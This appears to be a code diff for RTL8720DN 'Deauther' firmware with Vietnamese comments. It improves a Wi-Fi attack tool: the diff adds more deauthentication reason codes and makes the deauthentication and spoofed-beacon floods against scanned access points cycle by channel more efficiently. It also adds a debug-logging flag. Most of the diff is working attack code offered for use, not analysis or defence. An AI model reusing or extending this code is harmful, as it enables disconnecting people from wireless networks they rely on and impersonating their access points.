@@ -24,6 +24,9 @@
   #define LED_B 4
 #endif
 
+// Bật/tắt in log debug trong quá trình chuyển kênh (1: bật, 0: tắt)
+#define DEBUG_CHANNEL_SWITCH 0
+
 // Định nghĩa trạng thái hoạt động của thiết bị
 enum DeviceState {
   STATE_IDLE,
@@ -60,8 +63,8 @@ std::vector<int> beacon_targets_5;
 
 uint8_t deauth_bssid[6];
 
-const uint16_t DEAUTH_REASONS[] = {1, 2, 3, 7};
-const int DEAUTH_REASON_COUNT = 4;
+const uint16_t DEAUTH_REASONS[] = {1, 2, 3, 4, 7, 8};
+const int DEAUTH_REASON_COUNT = 6;
 
 #define FRAMES_PER_DEAUTH_24 5
 #define FRAMES_PER_DEAUTH_5  15
@@ -80,7 +83,6 @@ static int currentBeaconIndex24 = 0;
 static int currentBeaconIndex5  = 0;
 
 void updateLEDs() {
-  // Nếu chức năng tiết kiệm pin (tắt LED) được kích hoạt
   if (!ledEnabled) {
     digitalWrite(LED_R, LOW);
     digitalWrite(LED_G, LOW);
@@ -92,7 +94,6 @@ void updateLEDs() {
   static bool ledState = false;
   unsigned long now = millis();
   
-  // Reset trạng thái LED
   digitalWrite(LED_R, LOW);
   digitalWrite(LED_G, LOW);
   digitalWrite(LED_B, LOW);
@@ -214,6 +215,7 @@ void handleRoot(WiFiClient &client) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RTL8720DN Deauther</title>
     <style>
+      /* CSS style đã được giữ nguyên */
       * { box-sizing: border-box; margin: 0; padding: 0; }
       body { font-family: Arial, Helvetica, sans-serif; background: #f2f4f8; color: #333; line-height: 1.4; padding: 5px; font-size: 14px; }
       .container { max-width: 960px; margin: 10px auto; background: #fff; border-radius: 8px; box-shadow: 0 3px 8px rgba(0,0,0,0.1); overflow: hidden; }
@@ -299,13 +301,10 @@ void handleRoot(WiFiClient &client) {
         </form>
     )";
   }
-  // Nút bật/tắt LED nhằm tiết kiệm pin
   response += R"(
         <form method="post" action="/toggle_led_power">
           <button type="submit" class="btn btn-toggle">Tắt/Bật LED</button>
         </form>
-  )";
-  response += R"(
       </main>
     </div>
   </body>
@@ -441,6 +440,8 @@ void WebServerTask(void *pvParameters) {
               }
             }
             if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
+              sortTargetsByChannel(beacon_targets_24);
+              sortTargetsByChannel(beacon_targets_5);
               currentState = STATE_BEACON;
               currentBeaconIndex24 = 0;
               currentBeaconIndex5 = 0;
@@ -454,9 +455,7 @@ void WebServerTask(void *pvParameters) {
           }
           handleRoot(client);
         } else if (path == "/toggle_led_power") {
-          // Chuyển đổi trạng thái ledEnabled để bật/tắt LED nhằm tiết kiệm pin
           ledEnabled = !ledEnabled;
-          // Nếu tắt LED, đảm bảo tắt luôn các chân LED
           if (!ledEnabled) {
             digitalWrite(LED_R, LOW);
             digitalWrite(LED_G, LOW);
@@ -483,10 +482,16 @@ void AttackTask(void *pvParameters) {
         int idx = attack_targets_24[currentTargetIndex24];
         if (idx >= 0 && idx < (int)scan_results.size()) {
           uint8_t currentChannel = scan_results[idx].channel;
-          unsigned long startTime = micros();
+          // Chỉ chuyển kênh mà không in log debug nếu tắt DEBUG_CHANNEL_SWITCH
           wext_set_channel(WLAN0_NAME, currentChannel);
-          unsigned long endTime = micros();
-          DEBUG_SER_PRINT("2.4GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
+          #if DEBUG_CHANNEL_SWITCH
+          {
+            unsigned long startTime = micros();
+            wext_set_channel(WLAN0_NAME, currentChannel);
+            unsigned long endTime = micros();
+            DEBUG_SER_PRINT("2.4GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
+          }
+          #endif
           for (size_t i = currentTargetIndex24; i < attack_targets_24.size() && scan_results[attack_targets_24[i]].channel == currentChannel; i++) {
             int targetIdx = attack_targets_24[i];
             memcpy(deauth_bssid, scan_results[targetIdx].bssid, 6);
@@ -507,10 +512,15 @@ void AttackTask(void *pvParameters) {
         int idx = attack_targets_5[currentTargetIndex5];
         if (idx >= 0 && idx < (int)scan_results.size()) {
           uint8_t currentChannel = scan_results[idx].channel;
-          unsigned long startTime = micros();
           wext_set_channel(WLAN0_NAME, currentChannel);
-          unsigned long endTime = micros();
-          DEBUG_SER_PRINT("5GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
+          #if DEBUG_CHANNEL_SWITCH
+          {
+            unsigned long startTime = micros();
+            wext_set_channel(WLAN0_NAME, currentChannel);
+            unsigned long endTime = micros();
+            DEBUG_SER_PRINT("5GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
+          }
+          #endif
           for (size_t i = currentTargetIndex5; i < attack_targets_5.size() && scan_results[attack_targets_5[i]].channel == currentChannel; i++) {
             int targetIdx = attack_targets_5[i];
             memcpy(deauth_bssid, scan_results[targetIdx].bssid, 6);
@@ -540,26 +550,56 @@ void BeaconTask(void *pvParameters) {
       if (!beacon_targets_24.empty()) {
         int idx = beacon_targets_24[currentBeaconIndex24];
         if (idx >= 0 && idx < (int)scan_results.size()) {
-          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
-          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
-            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
-            vTaskDelay(pdMS_TO_TICKS(5));
+          uint8_t currentChannel = scan_results[idx].channel;
+          wext_set_channel(WLAN0_NAME, currentChannel);
+          #if DEBUG_CHANNEL_SWITCH
+          {
+            unsigned long startTime = micros();
+            wext_set_channel(WLAN0_NAME, currentChannel);
+            unsigned long endTime = micros();
+            DEBUG_SER_PRINT("2.4GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
           }
-          DEBUG_SER_PRINT("Beacon sent for 2.4GHz target idx: " + String(idx) + "\n");
+          #endif
+          for (size_t i = currentBeaconIndex24; i < beacon_targets_24.size() &&
+               scan_results[beacon_targets_24[i]].channel == currentChannel; i++) {
+            int targetIdx = beacon_targets_24[i];
+            for (int j = 0; j < FRAMES_PER_BEACON; j++) {
+              wifi_tx_beacon_frame(scan_results[targetIdx].bssid, broadcast, scan_results[targetIdx].ssid.c_str());
+              vTaskDelay(pdMS_TO_TICKS(5));
+            }
+            DEBUG_SER_PRINT("Beacon sent for 2.4GHz target idx: " + String(targetIdx) + "\n");
+            currentBeaconIndex24++;
+          }
+          if (currentBeaconIndex24 >= (int)beacon_targets_24.size())
+            currentBeaconIndex24 = 0;
         }
-        currentBeaconIndex24 = (currentBeaconIndex24 + 1) % beacon_targets_24.size();
       }
       if (!beacon_targets_5.empty()) {
         int idx = beacon_targets_5[currentBeaconIndex5];
         if (idx >= 0 && idx < (int)scan_results.size()) {
-          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
-          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
-            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
-            vTaskDelay(pdMS_TO_TICKS(5));
+          uint8_t currentChannel = scan_results[idx].channel;
+          wext_set_channel(WLAN0_NAME, currentChannel);
+          #if DEBUG_CHANNEL_SWITCH
+          {
+            unsigned long startTime = micros();
+            wext_set_channel(WLAN0_NAME, currentChannel);
+            unsigned long endTime = micros();
+            DEBUG_SER_PRINT("5GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
           }
-          DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(idx) + "\n");
+          #endif
+          for (size_t i = currentBeaconIndex5; i < beacon_targets_5.size() &&
+               scan_results[beacon_targets_5[i]].channel == currentChannel; i++) {
+            int targetIdx = beacon_targets_5[i];
+            for (int j = 0; j < FRAMES_PER_BEACON; j++) {
+              wifi_tx_beacon_frame(scan_results[targetIdx].bssid, broadcast, scan_results[targetIdx].ssid.c_str());
+              vTaskDelay(pdMS_TO_TICKS(5));
+            }
+            DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(targetIdx) + "\n");
+            currentBeaconIndex5++;
+          }
+          if (currentBeaconIndex5 >= (int)beacon_targets_5.size())
+            currentBeaconIndex5 = 0;
         }
-        currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
       }
     }
     vTaskDelay(pdMS_TO_TICKS(10));
